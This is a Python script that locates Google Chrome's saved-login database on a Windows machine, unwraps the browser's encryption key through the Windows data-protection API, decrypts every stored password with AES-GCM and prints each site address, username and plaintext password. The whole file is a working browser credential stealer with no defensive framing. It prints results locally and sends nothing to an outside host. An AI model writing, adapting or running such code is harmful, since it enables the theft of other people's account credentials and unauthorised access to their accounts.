import os
import shutil
import sqlite3
import base64
import json
import win32crypt
from Cryptodome.Cipher import AES



def key_finder():
    keyloc = os.path.join( os.environ['USERPROFILE'], "AppData\\Local\\Google\\Chrome\\User Data\\Local State")
    try:
        with open(keyloc, "r") as file:
        
            local_state_data = json.loads(file.read())
        
              
        encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encryption_key = encryption_key[5:]
      
     
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    except FileNotFoundError:
        print("FileNotFoundError successfully handled")
    

def chrome_decryptor(password, key):
    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()
    except:
        return "Error"

    
def main():
    try:
        username = os.environ['USERPROFILE']

        filename = os.path.join( username, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
        print(filename)
        db_name = "TempChromePass.db"

        
        try:
            shutil.copyfile(filename, db_name)
            print("Successfully copied")
        
            db = sqlite3.connect(db_name)

            cursor = db.cursor()

            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")
            key = key_finder()
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                user_name = row[2]
                decrypted_password = chrome_decryptor(row[3], key)
                date_of_creation = row[4]
                last_usuage = row[5]
                  
                if user_name or decrypted_password:
                    print(f"Origin URL: {origin_url}")
                    print(f"Action URL: {action_url}")
                    print(f"User name: {user_name}")
                    print(f"Decrypted Password: {decrypted_password}")
                    print("=============================================")
                  
            cursor.close()
            db.close()

            try:
                os.remove(db_name)
            except OSError as e: 
                print("Failed with:", e.strerror)
                print("Error code:", e.code) 
                
        except shutil.SameFileError:
            print("File source and destination are the same")
                  
        except PermissionError:
            print("Permission error")

        except:
            print("Error has occured with copying")

    except KeyError:
        print("User variable does not exist")


if __name__=="__main__":
    main()

